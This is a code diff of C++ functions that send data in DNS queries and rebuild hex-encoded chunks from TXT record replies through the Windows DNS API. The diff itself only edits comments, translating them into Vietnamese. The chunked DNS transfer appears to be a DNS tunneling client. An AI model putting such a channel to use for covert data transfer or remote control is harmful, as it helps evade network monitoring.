@@ -174,7 +174,7 @@ int sendDataTypeC(int& id, int& packetNumber, size_t& offset, const char* domain
 	std::string full = fullStream.str();
 	const char* pOwnerName = full.c_str();
 	
-	// Debug output
+
 	std::cout << "[sendDataTypeC] Query: " << full << std::endl;
 	std::cout << "[sendDataTypeC] Query length: " << full.length() << " chars" << std::endl;
 	
@@ -283,7 +283,7 @@ int sendDataTypeP(int& id, int& packetNumber, size_t& offset, const char* domain
 	std::string full = fullStream.str();
 	const char* pOwnerName = full.c_str();
 	
-	WORD wType = DNS_TYPE_TEXT; // 16
+	WORD wType = DNS_TYPE_TEXT; // DNS TXT record type
 	PDNS_RECORD pDnsRecord = nullptr;
 	
 	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
@@ -320,15 +320,15 @@ int sendDataTypeP(int& id, int& packetNumber, size_t& offset, const char* domain
             {
                 std::wstring txtWide = pDnsRecord->Data.TXT.pStringArray[0];
 
-                // --- TXT rỗng => hết chunk ---
+                // TXT rong => het chunk de gui
                 if (txtWide.empty()) {
                     retCode = 0;
                     DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
                     goto cleanup;
                 }
 
-                // TXT record packs 2 ASCII chars per wchar_t (little-endian)
-                // Extract both low and high bytes from each wchar_t
+                // Windows DNS API pack 2 ASCII char vao moi wchar_t (little-endian)
+                // Tach ca low byte va high byte tu moi wchar_t
                 std::string hexStr;
                 hexStr.reserve(txtWide.length() * 2);
                 for (wchar_t wc : txtWide) {
